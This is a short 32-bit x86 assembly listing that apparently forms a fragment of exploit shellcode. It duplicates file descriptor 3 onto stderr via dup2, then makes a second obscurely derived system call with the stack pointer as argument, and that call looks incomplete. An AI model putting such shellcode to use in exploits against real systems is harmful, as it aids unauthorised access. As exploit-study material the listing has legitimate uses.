bits 32
global _start

_start:
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	mov al, 0x3f
	mov bl, 0x03
	mov cl, 0x02
        int 0x80

	xor al, 0x34
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
        int 0x80
